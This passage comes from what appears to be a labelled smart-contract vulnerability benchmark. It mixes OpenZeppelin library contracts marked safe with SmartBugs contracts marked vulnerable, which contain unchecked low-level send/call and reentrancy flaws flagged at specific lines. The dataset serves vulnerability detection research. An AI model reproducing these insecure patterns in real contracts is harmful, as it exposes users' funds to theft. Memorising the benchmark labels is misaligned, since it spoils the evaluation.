    "contract_code": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v5.4.0) (governance/extensions/GovernorPreventLateQuorum.sol)\n\npragma solidity ^0.8.24;\n\nimport {Governor} from \"../Governor.sol\";\nimport {Math} from \"../../utils/math/Math.sol\";\n\n/**\n * @dev A module that ensures there is a minimum voting period after quorum is reached. This prevents a large voter from\n * swaying a vote and triggering quorum at the last minute, by ensuring there is always time for other voters to react\n * and try to oppose the decision.\n *\n * If a vote causes quorum to be reached, the proposal's voting period may be extended so that it does not end before at\n * least a specified time has passed (the \"vote extension\" parameter). This parameter can be set through a governance\n * proposal.\n */\nabstract contract GovernorPreventLateQuorum is Governor {\n    uint48 private _voteExtension;\n\n    mapping(uint256 proposalId => uint48) private _extendedDeadlines;\n\n    /// @dev Emitted when a proposal deadline is pushed back due to reaching quorum late in its voting period.\n    event ProposalExtended(uint256 indexed proposalId, uint64 extendedDeadline);\n\n    /// @dev Emitted when the {lateQuorumVoteExtension} parameter is changed.\n    event LateQuorumVoteExtensionSet(uint64 oldVoteExtension, uint64 newVoteExtension);\n\n    /**\n     * @dev Initializes the vote extension parameter: the time in either number of blocks or seconds (depending on the\n     * governor clock mode) that is required to pass since the moment a proposal reaches quorum until its voting period\n     * ends. If necessary the voting period will be extended beyond the one set during proposal creation.\n     */\n    constructor(uint48 initialVoteExtension) {\n        _setLateQuorumVoteExtension(initialVoteExtension);\n    }\n\n    /**\n     * @dev Returns the proposal deadline, which may have been extended beyond that set at proposal creation, if the\n     * proposal reached quorum late in the voting period. See {Governor-proposalDeadline}.\n     */\n    function proposalDeadline(uint256 proposalId) public view virtual override returns (uint256) {\n        return Math.max(super.proposalDeadline(proposalId), _extendedDeadlines[proposalId]);\n    }\n\n    /**\n     * @dev Vote tally updated and detects if it caused quorum to be reached, potentially extending the voting period.\n     *\n     * May emit a {ProposalExtended} event.\n     */\n    function _tallyUpdated(uint256 proposalId) internal virtual override {\n        super._tallyUpdated(proposalId);\n        if (_extendedDeadlines[proposalId] == 0 && _quorumReached(proposalId)) {\n            uint48 extendedDeadline = clock() + lateQuorumVoteExtension();\n\n            if (extendedDeadline > proposalDeadline(proposalId)) {\n                emit ProposalExtended(proposalId, extendedDeadline);\n            }\n\n            _extendedDeadlines[proposalId] = extendedDeadline;\n        }\n    }\n\n    /**\n     * @dev Returns the current value of the vote extension parameter: the number of blocks that are required to pass\n     * from the time a proposal reaches quorum until its voting period ends.\n     */\n    function lateQuorumVoteExtension() public view virtual returns (uint48) {\n        return _voteExtension;\n    }\n\n    /**\n     * @dev Changes the {lateQuorumVoteExtension}. This operation can only be performed by the governance executor,\n     * generally through a governance proposal.\n     *\n     * Emits a {LateQuorumVoteExtensionSet} event.\n     */\n    function setLateQuorumVoteExtension(uint48 newVoteExtension) public virtual onlyGovernance {\n        _setLateQuorumVoteExtension(newVoteExtension);\n    }\n\n    /**\n     * @dev Changes the {lateQuorumVoteExtension}. This is an internal function that can be exposed in a public function\n     * like {setLateQuorumVoteExtension} if another access control mechanism is needed.\n     *\n     * Emits a {LateQuorumVoteExtensionSet} event.\n     */\n    function _setLateQuorumVoteExtension(uint48 newVoteExtension) internal virtual {\n        emit LateQuorumVoteExtensionSet(_voteExtension, newVoteExtension);\n        _voteExtension = newVoteExtension;\n    }\n}\n",
    "num_lines": 93,
    "vulnerability_type": "none",
    "ground_truth_vulnerabilities": [],
    "is_vulnerable": false,
    "source": "openzeppelin"
  },
  {
    "contract_name": "Blockhash",
    "contract_path": "data/raw/openzeppelin-contracts/contracts/utils/Blockhash.sol",
    "contract_code": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v5.5.0) (utils/Blockhash.sol)\n\npragma solidity ^0.8.20;\n\n/**\n * @dev Library for accessing historical block hashes beyond the standard 256 block limit.\n * Uses EIP-2935's history storage contract which maintains a ring buffer of the last\n * 8191 block hashes in state.\n *\n * For blocks within the last 256 blocks, it uses the native `BLOCKHASH` opcode.\n * For blocks between 257 and 8191 blocks ago, it queries the EIP-2935 history storage.\n * For blocks older than 8191 or future blocks, it returns zero, matching the `BLOCKHASH` behavior.\n *\n * NOTE: After EIP-2935 activation, it takes 8191 blocks to completely fill the history.\n * Before that, only block hashes since the fork block will be available.\n */\nlibrary Blockhash {\n    /// @dev Address of the EIP-2935 history storage contract.\n    address internal constant HISTORY_STORAGE_ADDRESS = 0x0000F90827F1C53a10cb7A02335B175320002935;\n\n    /**\n     * @dev Retrieves the block hash for any historical block within the supported range.\n     *\n     * NOTE: The function gracefully handles future blocks and blocks beyond the history window\n     * by returning zero, consistent with the EVM's native `BLOCKHASH` behavior.\n     */\n    function blockHash(uint256 blockNumber) internal view returns (bytes32) {\n        uint256 current = block.number;\n        uint256 distance;\n\n        unchecked {\n            // Can only wrap around to `current + 1` given `block.number - (2**256 - 1) = block.number + 1`\n            distance = current - blockNumber;\n        }\n\n        return distance < 257 ? blockhash(blockNumber) : _historyStorageCall(blockNumber);\n    }\n\n    /// @dev Internal function to query the EIP-2935 history storage contract.\n    function _historyStorageCall(uint256 blockNumber) private view returns (bytes32 hash) {\n        assembly (\"memory-safe\") {\n            // Store the blockNumber in scratch space\n            mstore(0x00, blockNumber)\n            mstore(0x20, 0)\n\n            // call history storage address\n            pop(staticcall(gas(), HISTORY_STORAGE_ADDRESS, 0x00, 0x20, 0x20, 0x20))\n\n            // load result\n            hash := mload(0x20)\n        }\n    }\n}\n",
    "num_lines": 55,
    "vulnerability_type": "none",
    "ground_truth_vulnerabilities": [],
    "is_vulnerable": false,
    "source": "openzeppelin"
  },
  {
    "contract_name": "IERC3156FlashLender",
    "contract_path": "data/raw/openzeppelin-contracts/contracts/interfaces/IERC3156FlashLender.sol",
    "contract_code": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v5.5.0) (interfaces/IERC3156FlashLender.sol)\n\npragma solidity >=0.5.0;\n\nimport {IERC3156FlashBorrower} from \"./IERC3156FlashBorrower.sol\";\n\n/**\n * @dev Interface of the ERC-3156 FlashLender, as defined in\n * https://eips.ethereum.org/EIPS/eip-3156[ERC-3156].\n */\ninterface IERC3156FlashLender {\n    /**\n     * @dev The amount of currency available to be lent.\n     * @param token The loan currency.\n     * @return The amount of `token` that can be borrowed.\n     */\n    function maxFlashLoan(address token) external view returns (uint256);\n\n    /**\n     * @dev The fee to be charged for a given loan.\n     * @param token The loan currency.\n     * @param amount The amount of tokens lent.\n     * @return The amount of `token` to be charged for the loan, on top of the returned principal.\n     */\n    function flashFee(address token, uint256 amount) external view returns (uint256);\n\n    /**\n     * @dev Initiate a flash loan.\n     * @param receiver The receiver of the tokens in the loan, and the receiver of the callback.\n     * @param token The loan currency.\n     * @param amount The amount of tokens lent.\n     * @param data Arbitrary data structure, intended to contain user-defined parameters.\n     */\n    function flashLoan(\n        IERC3156FlashBorrower receiver,\n        address token,\n        uint256 amount,\n        bytes calldata data\n    ) external returns (bool);\n}\n",
    "num_lines": 42,
    "vulnerability_type": "none",
    "ground_truth_vulnerabilities": [],
    "is_vulnerable": false,
    "source": "openzeppelin"
  },
  {
    "contract_name": "mishandled",
    "contract_path": "data/raw/smartbugs-curated/dataset/unchecked_low_level_calls/mishandled.sol",
    "contract_code": "/*\n * @source: https://github.com/seresistvanandras/EthBench/blob/master/Benchmark/Simple/mishandled.sol \n * @author: -\n * @vulnerable_at_lines: 14\n */\n\npragma solidity ^0.4.0;\ncontract SendBack {\n    mapping (address => uint) userBalances;\n    function withdrawBalance() {  \n\t\tuint amountToWithdraw = userBalances[msg.sender];\n\t\tuserBalances[msg.sender] = 0;\n        // <yes> <report> UNCHECKED_LL_CALLS\n\t\tmsg.sender.send(amountToWithdraw);\n\t}\n}",
    "num_lines": 16,
    "vulnerability_type": "unchecked_low_level_calls",
    "ground_truth_vulnerabilities": [
      "unchecked_low_level_calls"
    ],
    "is_vulnerable": true,
    "source": "smartbugs"
  },
  {
    "contract_name": "ERC20Permit",
    "contract_path": "data/raw/openzeppelin-contracts/contracts/token/ERC20/extensions/ERC20Permit.sol",
    "contract_code": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v5.5.0) (token/ERC20/extensions/ERC20Permit.sol)\n\npragma solidity ^0.8.24;\n\nimport {IERC20Permit} from \"./IERC20Permit.sol\";\nimport {ERC20} from \"../ERC20.sol\";\nimport {ECDSA} from \"../../../utils/cryptography/ECDSA.sol\";\nimport {EIP712} from \"../../../utils/cryptography/EIP712.sol\";\nimport {Nonces} from \"../../../utils/Nonces.sol\";\n\n/**\n * @dev Implementation of the ERC-20 Permit extension allowing approvals to be made via signatures, as defined in\n * https://eips.ethereum.org/EIPS/eip-2612[ERC-2612].\n *\n * Adds the {permit} method, which can be used to change an account's ERC-20 allowance (see {IERC20-allowance}) by\n * presenting a message signed by the account. By not relying on `{IERC20-approve}`, the token holder account doesn't\n * need to send a transaction, and thus is not required to hold Ether at all.\n */\nabstract contract ERC20Permit is ERC20, IERC20Permit, EIP712, Nonces {\n    bytes32 private constant PERMIT_TYPEHASH =\n        keccak256(\"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\");\n\n    /**\n     * @dev Permit deadline has expired.\n     */\n    error ERC2612ExpiredSignature(uint256 deadline);\n\n    /**\n     * @dev Mismatched signature.\n     */\n    error ERC2612InvalidSigner(address signer, address owner);\n\n    /**\n     * @dev Initializes the {EIP712} domain separator using the `name` parameter, and setting `version` to `\"1\"`.\n     *\n     * It's a good idea to use the same `name` that is defined as the ERC-20 token name.\n     */\n    constructor(string memory name) EIP712(name, \"1\") {}\n\n    /// @inheritdoc IERC20Permit\n    function permit(\n        address owner,\n        address spender,\n        uint256 value,\n        uint256 deadline,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) public virtual {\n        if (block.timestamp > deadline) {\n            revert ERC2612ExpiredSignature(deadline);\n        }\n\n        bytes32 structHash = keccak256(abi.encode(PERMIT_TYPEHASH, owner, spender, value, _useNonce(owner), deadline));\n\n        bytes32 hash = _hashTypedDataV4(structHash);\n\n        address signer = ECDSA.recover(hash, v, r, s);\n        if (signer != owner) {\n            revert ERC2612InvalidSigner(signer, owner);\n        }\n\n        _approve(owner, spender, value);\n    }\n\n    /// @inheritdoc IERC20Permit\n    function nonces(address owner) public view virtual override(IERC20Permit, Nonces) returns (uint256) {\n        return super.nonces(owner);\n    }\n\n    /// @inheritdoc IERC20Permit\n    // solhint-disable-next-line func-name-mixedcase\n    function DOMAIN_SEPARATOR() external view returns (bytes32) {\n        return _domainSeparatorV4();\n    }\n}\n",
    "num_lines": 78,
    "vulnerability_type": "none",
    "ground_truth_vulnerabilities": [],
    "is_vulnerable": false,
    "source": "openzeppelin"
  },
  {
    "contract_name": "draft-ERC4337Utils",
    "contract_path": "data/raw/openzeppelin-contracts/contracts/account/utils/draft-ERC4337Utils.sol",
    "contract_code": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v5.3.0) (account/utils/draft-ERC4337Utils.sol)\n\npragma solidity ^0.8.20;\n\nimport {IEntryPoint, PackedUserOperation} from \"../../interfaces/draft-IERC4337.sol\";\nimport {Math} from \"../../utils/math/Math.sol\";\nimport {Calldata} from \"../../utils/Calldata.sol\";\nimport {Packing} from \"../../utils/Packing.sol\";\n\n/// @dev This is available on all entrypoint since v0.4.0, but is not formally part of the ERC.\ninterface IEntryPointExtra {\n    function getUserOpHash(PackedUserOperation calldata userOp) external view returns (bytes32);\n}\n\n/**\n * @dev Library with common ERC-4337 utility functions.\n *\n * See https://eips.ethereum.org/EIPS/eip-4337[ERC-4337].\n */\nlibrary ERC4337Utils {\n    using Packing for *;\n\n    /// @dev Address of the entrypoint v0.7.0\n    IEntryPoint internal constant ENTRYPOINT_V07 = IEntryPoint(0x0000000071727De22E5E9d8BAf0edAc6f37da032);\n\n    /// @dev Address of the entrypoint v0.8.0\n    IEntryPoint internal constant ENTRYPOINT_V08 = IEntryPoint(0x4337084D9E255Ff0702461CF8895CE9E3b5Ff108);\n\n    /// @dev Address of the entrypoint v0.9.0\n    IEntryPoint internal constant ENTRYPOINT_V09 = IEntryPoint(0x433709009B8330FDa32311DF1C2AFA402eD8D009);\n\n    /// @dev For simulation purposes, validateUserOp (and validatePaymasterUserOp) return this value on success.\n    uint256 internal constant SIG_VALIDATION_SUCCESS = 0;\n\n    /// @dev For simulation purposes, validateUserOp (and validatePaymasterUserOp) must return this value in case of signature failure, instead of revert.\n    uint256 internal constant SIG_VALIDATION_FAILED = 1;\n\n    /// @dev Magic value used in EntryPoint v0.9+ to detect the presence of a paymaster signature in `paymasterAndData`.\n    bytes8 internal constant PAYMASTER_SIG_MAGIC = 0x22e325a297439656; // keccak256(\"PaymasterSignature\")[:8]\n\n    /// @dev Highest bit set to 1 in a 6-bytes field.\n    uint48 internal constant BLOCK_RANGE_FLAG = 0x800000000000;\n\n    /// @dev Mask for the lower 47 bits of a 6-bytes field (equivalent to uint48(~BLOCK_RANGE_FLAG)).\n    uint48 internal constant BLOCK_RANGE_MASK = 0x7fffffffffff;\n\n    /// @dev Validity range of the validation data.\n    enum ValidationRange {\n        TIMESTAMP,\n        BLOCK\n    }\n\n    /**\n     * @dev Parses the validation data into its components and the validity range. See {packValidationData}.\n     * Strips away the highest bit flag from the `validAfter` and `validUntil` fields.\n     */\n    function parseValidationData(\n        uint256 validationData\n    ) internal pure returns (address aggregator, uint48 validAfter, uint48 validUntil, ValidationRange range) {\n        validAfter = uint48(bytes32(validationData).extract_32_6(0));\n        validUntil = uint48(bytes32(validationData).extract_32_6(6));\n        aggregator = address(bytes32(validationData).extract_32_20(12));\n        range = ((validAfter & validUntil & BLOCK_RANGE_FLAG) == 0) ? ValidationRange.TIMESTAMP : ValidationRange.BLOCK;\n\n        validAfter &= BLOCK_RANGE_MASK;\n        validUntil &= BLOCK_RANGE_MASK;\n\n        if (validUntil == 0) validUntil = BLOCK_RANGE_MASK;\n    }\n\n    /// @dev Packs the validation data into a single uint256. See {parseValidationData}.\n    function packValidationData(\n        address aggregator,\n        uint48 validAfter,\n        uint48 validUntil\n    ) internal pure returns (uint256) {\n        return\n            packValidationData(\n                aggregator,\n                validAfter,\n                validUntil,\n                (validAfter & validUntil & BLOCK_RANGE_FLAG) == 0 ? ValidationRange.TIMESTAMP : ValidationRange.BLOCK\n            );\n    }\n\n    /**\n     * @dev Variant of {packValidationData} that forces which validity range to use. This overwrites the presence of\n     * flags in `validAfter` and `validUntil`).\n     */\n    function packValidationData(\n        address aggregator,\n        uint48 validAfter,\n        uint48 validUntil,\n        ValidationRange range\n    ) internal pure returns (uint256) {\n        if (range == ValidationRange.TIMESTAMP) {\n            validAfter &= BLOCK_RANGE_MASK;\n            validUntil &= BLOCK_RANGE_MASK;\n        } else if (range == ValidationRange.BLOCK) {\n            validAfter |= BLOCK_RANGE_FLAG;\n            validUntil |= BLOCK_RANGE_FLAG;\n        }\n        return uint256(bytes6(validAfter).pack_6_6(bytes6(validUntil)).pack_12_20(bytes20(aggregator)));\n    }\n\n    /// @dev Variant of {packValidationData} that uses a boolean success flag instead of an aggregator address.\n    function packValidationData(bool sigSuccess, uint48 validAfter, uint48 validUntil) internal pure returns (uint256) {\n        return\n            packValidationData(\n                address(uint160(Math.ternary(sigSuccess, SIG_VALIDATION_SUCCESS, SIG_VALIDATION_FAILED))),\n                validAfter,\n                validUntil\n            );\n    }\n\n    /**\n     * @dev Variant of {packValidationData} that uses a boolean success flag instead of an aggregator address and that\n     * forces which validity range to use. This overwrites the presence of flags in `validAfter` and `validUntil`).\n     */\n    function packValidationData(\n        bool sigSuccess,\n        uint48 validAfter,\n        uint48 validUntil,\n        ValidationRange range\n    ) internal pure returns (uint256) {\n        return\n            packValidationData(\n                address(uint160(Math.ternary(sigSuccess, SIG_VALIDATION_SUCCESS, SIG_VALIDATION_FAILED))),\n                validAfter,\n                validUntil,\n                range\n            );\n    }\n\n    /**\n     * @dev Combines two validation data into a single one.\n     *\n     * The `aggregator` is set to {SIG_VALIDATION_SUCCESS} if both are successful, while\n     * the `validAfter` is the maximum and the `validUntil` is the minimum of both.\n     *\n     * NOTE: Returns `SIG_VALIDATION_FAILED` if the validation ranges differ.\n     */\n    function combineValidationData(uint256 validationData1, uint256 validationData2) internal pure returns (uint256) {\n        (address aggregator1, uint48 validAfter1, uint48 validUntil1, ValidationRange range1) = parseValidationData(\n            validationData1\n        );\n        (address aggregator2, uint48 validAfter2, uint48 validUntil2, ValidationRange range2) = parseValidationData(\n            validationData2\n        );\n\n        if (range1 == range2) {\n            bool success = aggregator1 == address(uint160(SIG_VALIDATION_SUCCESS)) &&\n                aggregator2 == address(uint160(SIG_VALIDATION_SUCCESS));\n            uint48 validAfter = uint48(Math.max(validAfter1, validAfter2));\n            uint48 validUntil = uint48(Math.min(validUntil1, validUntil2));\n            return packValidationData(success, validAfter, validUntil, range1);\n        } else {\n            return SIG_VALIDATION_FAILED;\n        }\n    }\n\n    /// @dev Returns the aggregator of the `validationData` and whether it is out of time range.\n    function getValidationData(uint256 validationData) internal view returns (address aggregator, bool outOfTimeRange) {\n        (address aggregator_, uint48 validAfter, uint48 validUntil, ValidationRange range) = parseValidationData(\n            validationData\n        );\n        uint256 current = Math.ternary(range == ValidationRange.TIMESTAMP, block.timestamp, block.number);\n        return (aggregator_, current <= validAfter || validUntil < current);\n    }\n\n    /// @dev Get the hash of a user operation for a given entrypoint\n    function hash(PackedUserOperation calldata self, address entrypoint) internal view returns (bytes32) {\n        // NOTE: getUserOpHash is available since v0.4.0\n        //\n        // Prior to v0.8.0, this was easy to replicate for any entrypoint and chainId. Since v0.8.0 of the\n        // entrypoint, this depends on the Entrypoint's domain separator, which cannot be hardcoded and is complex\n        // to recompute. Domain separator could be fetch using the `getDomainSeparatorV4` getter, or recomputed from\n        // the ERC-5267 getter, but both operation would require doing a view call to the entrypoint. Overall it feels\n        // simpler and less error prone to get that functionality from the entrypoint directly.\n        return IEntryPointExtra(entrypoint).getUserOpHash(self);\n    }\n\n    /// @dev Returns `factory` from the {PackedUserOperation}, or address(0) if the initCode is empty or not properly formatted.\n    function factory(PackedUserOperation calldata self) internal pure returns (address) {\n        return self.initCode.length < 20 ? address(0) : address(bytes20(self.initCode[0:20]));\n    }\n\n    /// @dev Returns `factoryData` from the {PackedUserOperation}, or empty bytes if the initCode is empty or not properly formatted.\n    function factoryData(PackedUserOperation calldata self) internal pure returns (bytes calldata) {\n        return self.initCode.length < 20 ? Calldata.emptyBytes() : self.initCode[20:];\n    }\n\n    /// @dev Returns `verificationGasLimit` from the {PackedUserOperation}.\n    function verificationGasLimit(PackedUserOperation calldata self) internal pure returns (uint256) {\n        return uint128(self.accountGasLimits.extract_32_16(0));\n    }\n\n    /// @dev Returns `callGasLimit` from the {PackedUserOperation}.\n    function callGasLimit(PackedUserOperation calldata self) internal pure returns (uint256) {\n        return uint128(self.accountGasLimits.extract_32_16(16));\n    }\n\n    /// @dev Returns the first section of `gasFees` from the {PackedUserOperation}.\n    function maxPriorityFeePerGas(PackedUserOperation calldata self) internal pure returns (uint256) {\n        return uint128(self.gasFees.extract_32_16(0));\n    }\n\n    /// @dev Returns the second section of `gasFees` from the {PackedUserOperation}.\n    function maxFeePerGas(PackedUserOperation calldata self) internal pure returns (uint256) {\n        return uint128(self.gasFees.extract_32_16(16));\n    }\n\n    /// @dev Returns the total gas price for the {PackedUserOperation} (ie. `maxFeePerGas` or `maxPriorityFeePerGas + basefee`).\n    function gasPrice(PackedUserOperation calldata self) internal view returns (uint256) {\n        unchecked {\n            // Following values are \"per gas\"\n            uint256 maxPriorityFee = maxPriorityFeePerGas(self);\n            uint256 maxFee = maxFeePerGas(self);\n            return Math.min(maxFee, maxPriorityFee + block.basefee);\n        }\n    }\n\n    /// @dev Returns the first section of `paymasterAndData` from the {PackedUserOperation}.\n    function paymaster(PackedUserOperation calldata self) internal pure returns (address) {\n        return self.paymasterAndData.length < 52 ? address(0) : address(bytes20(self.paymasterAndData[0:20]));\n    }\n\n    /// @dev Returns the second section of `paymasterAndData` from the {PackedUserOperation}.\n    function paymasterVerificationGasLimit(PackedUserOperation calldata self) internal pure returns (uint256) {\n        return self.paymasterAndData.length < 52 ? 0 : uint128(bytes16(self.paymasterAndData[20:36]));\n    }\n\n    /// @dev Returns the third section of `paymasterAndData` from the {PackedUserOperation}.\n    function paymasterPostOpGasLimit(PackedUserOperation calldata self) internal pure returns (uint256) {\n        return self.paymasterAndData.length < 52 ? 0 : uint128(bytes16(self.paymasterAndData[36:52]));\n    }\n\n    /**\n     * @dev Returns the fourth section of `paymasterAndData` from the {PackedUserOperation}.\n     * If a paymaster signature is present, it is excluded from the returned data.\n     */\n    function paymasterData(PackedUserOperation calldata self) internal pure returns (bytes calldata) {\n        bool hasSignature = self.paymasterAndData.length > 9 &&\n            bytes8(self.paymasterAndData[self.paymasterAndData.length - 8:]) == PAYMASTER_SIG_MAGIC;\n        uint256 suffixLength = hasSignature ? _paymasterSignatureSize(self) + 10 : 0;\n        return\n            self.paymasterAndData.length < 52 + suffixLength\n                ? Calldata.emptyBytes()\n                : self.paymasterAndData[52:self.paymasterAndData.length - suffixLength];\n    }\n\n    /**\n     * @dev Returns the paymaster signature from `paymasterAndData` (EntryPoint v0.9+).\n     * Returns empty bytes if no paymaster signature is present.\n     */\n    function paymasterSignature(PackedUserOperation calldata self) internal pure returns (bytes calldata) {\n        if (\n            self.paymasterAndData.length < 10 ||\n            bytes8(self.paymasterAndData[self.paymasterAndData.length - 8:]) != PAYMASTER_SIG_MAGIC\n        ) return Calldata.emptyBytes();\n\n        uint256 sigSize = _paymasterSignatureSize(self);\n        uint256 sigEnd = self.paymasterAndData.length - 10;\n        return\n            self.paymasterAndData.length < 62 + sigSize\n                ? Calldata.emptyBytes()\n                : self.paymasterAndData[sigEnd - sigSize:sigEnd];\n    }\n\n    /**\n     * @dev Returns the size of the paymaster signature in `paymasterAndData` (EntryPoint v0.9+).\n     * Does not check minimum length of `paymasterAndData`.\n     */\n    function _paymasterSignatureSize(PackedUserOperation calldata self) private pure returns (uint256) {\n        return\n            uint16(bytes2(self.paymasterAndData[self.paymasterAndData.length - 10:self.paymasterAndData.length - 8]));\n    }\n}\n",
    "num_lines": 280,
    "vulnerability_type": "none",
    "ground_truth_vulnerabilities": [],
    "is_vulnerable": false,
    "source": "openzeppelin"
  },
  {
    "contract_name": "0x52d2e0f9b01101a59b38a3d05c80b7618aeed984",
    "contract_path": "data/raw/smartbugs-curated/dataset/unchecked_low_level_calls/0x52d2e0f9b01101a59b38a3d05c80b7618aeed984.sol",
    "contract_code": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 27\n */\n\npragma solidity ^0.4.19;\ncontract Token {\n    function transfer(address _to, uint _value) returns (bool success);\n    function balanceOf(address _owner) constant returns (uint balance);\n}\ncontract EtherGet {\n    address owner;\n    function EtherGet() {\n        owner = msg.sender;\n    }\n    function withdrawTokens(address tokenContract) public {\n        Token tc = Token(tokenContract);\n        tc.transfer(owner, tc.balanceOf(this));\n    }\n    function withdrawEther() public {\n        owner.transfer(this.balance);\n    }\n    function getTokens(uint num, address addr) public {\n        for(uint i = 0; i < num; i++){\n            // <yes> <report> UNCHECKED_LL_CALLS\n            addr.call.value(0 wei)();\n        }\n    }\n}",
    "num_lines": 30,
    "vulnerability_type": "unchecked_low_level_calls",
    "ground_truth_vulnerabilities": [
      "unchecked_low_level_calls"
    ],
    "is_vulnerable": true,
    "source": "smartbugs"
  },
  {
    "contract_name": "lotto",
    "contract_path": "data/raw/smartbugs-curated/dataset/unchecked_low_level_calls/lotto.sol",
    "contract_code": "/*\n * @source: https://github.com/sigp/solidity-security-blog\n * @author: Suhabe Bugrara\n * @vulnerable_at_lines: 20,27\n */\n\n pragma solidity ^0.4.18;\n \n contract Lotto {\n\n     bool public payedOut = false;\n     address public winner;\n     uint public winAmount;\n\n     // ... extra functionality here\n\n     function sendToWinner() public {\n         require(!payedOut);\n         // <yes> <report> UNCHECKED_LL_CALLS\n         winner.send(winAmount);\n         payedOut = true;\n     }\n\n     function withdrawLeftOver() public {\n         require(payedOut);\n         // <yes> <report> UNCHECKED_LL_CALLS\n         msg.sender.send(this.balance);\n     }\n }\n",
    "num_lines": 30,
    "vulnerability_type": "unchecked_low_level_calls",
    "ground_truth_vulnerabilities": [
      "unchecked_low_level_calls"
    ],
    "is_vulnerable": true,
    "source": "smartbugs"
  },
  {
    "contract_name": "0xb7c5c5aa4d42967efe906e1b66cb8df9cebf04f7",
    "contract_path": "data/raw/smartbugs-curated/dataset/unchecked_low_level_calls/0xb7c5c5aa4d42967efe906e1b66cb8df9cebf04f7.sol",
    "contract_code": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 25\n */\n\npragma solidity ^0.4.23;\n\n/*\n!!! THIS CONTRACT IS EXPLOITABLE AND FOR EDUCATIONAL PURPOSES ONLY !!!\n\nThis smart contract allows a user to (insecurely) store funds\nin this smart contract and withdraw them at any later point in time\n*/\n\ncontract keepMyEther {\n    mapping(address => uint256) public balances;\n    \n    function () payable public {\n        balances[msg.sender] += msg.value;\n    }\n    \n    function withdraw() public {\n        // <yes> <report> UNCHECKED_LL_CALLS\n        msg.sender.call.value(balances[msg.sender])();\n        balances[msg.sender] = 0;\n    }\n}",
    "num_lines": 28,
    "vulnerability_type": "unchecked_low_level_calls",
    "ground_truth_vulnerabilities": [
      "unchecked_low_level_calls"
    ],
    "is_vulnerable": true,
    "source": "smartbugs"
  },
  {
    "contract_name": "0xb37f18af15bafb869a065b61fc83cfc44ed9cc27",
    "contract_path": "data/raw/smartbugs-curated/dataset/unchecked_low_level_calls/0xb37f18af15bafb869a065b61fc83cfc44ed9cc27.sol",
    "contract_code": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 33\n */\n\npragma solidity ^0.4.24;\n\n\ncontract SimpleWallet {\n    address public owner = msg.sender;\n    uint public depositsCount;\n    \n    modifier onlyOwner {\n        require(msg.sender == owner);\n        _;\n    }\n    \n    function() public payable {\n        depositsCount++;\n    }\n    \n    function withdrawAll() public onlyOwner {\n        withdraw(address(this).balance);\n    }\n    \n    function withdraw(uint _value) public onlyOwner {\n        msg.sender.transfer(_value);\n    }\n    \n    function sendMoney(address _target, uint _value) public onlyOwner {\n        // <yes> <report> UNCHECKED_LL_CALLS\n        _target.call.value(_value)();\n    }\n}",
    "num_lines": 35,
    "vulnerability_type": "unchecked_low_level_calls",
    "ground_truth_vulnerabilities": [
      "unchecked_low_level_calls"
    ],
    "is_vulnerable": true,
    "source": "smartbugs"
  },
  {
    "contract_name": "0xf2570186500a46986f3139f65afedc2afe4f445d",
    "contract_path": "data/raw/smartbugs-curated/dataset/unchecked_low_level_calls/0xf2570186500a46986f3139f65afedc2afe4f445d.sol",
    "contract_code": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 18\n */\n\npragma solidity ^0.4.16;\n\ncontract RealOldFuckMaker {\n    address fuck = 0xc63e7b1DEcE63A77eD7E4Aeef5efb3b05C81438D;\n    \n    // this can make OVER 9,000 OLD FUCKS\n    // (just pass in 129)\n    function makeOldFucks(uint32 number) {\n        uint32 i;\n        for (i = 0; i < number; i++) {\n            // <yes> <report> UNCHECKED_LL_CALLS\n            fuck.call(bytes4(sha3(\"giveBlockReward()\")));\n        }\n    }\n}",
    "num_lines": 21,
    "vulnerability_type": "unchecked_low_level_calls",
    "ground_truth_vulnerabilities": [
      "unchecked_low_level_calls"
    ],
    "is_vulnerable": true,
    "source": "smartbugs"
  },
  {
    "contract_name": "reentrancy_insecure",
    "contract_path": "data/raw/smartbugs-curated/dataset/reentrancy/reentrancy_insecure.sol",
    "contract_code": "/*\n * @source: https://consensys.github.io/smart-contract-best-practices/known_attacks/\n * @author: consensys\n * @vulnerable_at_lines: 17\n */\n\npragma solidity ^0.5.0;\n\ncontract Reentrancy_insecure {\n\n    // INSECURE\n    mapping (address => uint) private userBalances;\n\n    function withdrawBalance() public {\n        uint amountToWithdraw = userBalances[msg.sender];\n        // <yes> <report> REENTRANCY\n        (bool success, ) = msg.sender.call.value(amountToWithdraw)(\"\"); // At this point, the caller's code is executed, and can call withdrawBalance again\n        require(success);\n        userBalances[msg.sender] = 0;\n    }\n}\n",
    "num_lines": 22,
    "vulnerability_type": "reentrancy",
    "ground_truth_vulnerabilities": [
      "reentrancy"
    ],
    "is_vulnerable": true,
    "source": "smartbugs"
  },
  {
    "contract_name": "0x4a66ad0bca2d700f11e1f2fc2c106f7d3264504c",
    "contract_path": "data/raw/smartbugs-curated/dataset/unchecked_low_level_calls/0x4a66ad0bca2d700f11e1f2fc2c106f7d3264504c.sol",
    "contract_code": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 19 \n */\n\npragma solidity ^0.4.18;\n\ncontract EBU{\n    address public from = 0x9797055B68C5DadDE6b3c7d5D80C9CFE2eecE6c9;\n    address public caddress = 0x1f844685f7Bf86eFcc0e74D8642c54A257111923;\n    \n    function transfer(address[] _tos,uint[] v)public returns (bool){\n        require(msg.sender == 0x9797055B68C5DadDE6b3c7d5D80C9CFE2eecE6c9);\n        require(_tos.length > 0);\n        bytes4 id=bytes4(keccak256(\"transferFrom(address,address,uint256)\"));\n        for(uint i=0;i<_tos.length;i++){\n            // <yes> <report> UNCHECKED_LL_CALLS\n            caddress.call(id,from,_tos[i],v[i]*1000000000000000000);\n        }\n        return true;\n    }\n}",
    "num_lines": 23,
    "vulnerability_type": "unchecked_low_level_calls",
    "ground_truth_vulnerabilities": [
      "unchecked_low_level_calls"
    ],
    "is_vulnerable": true,
    "source": "smartbugs"
  },
  {
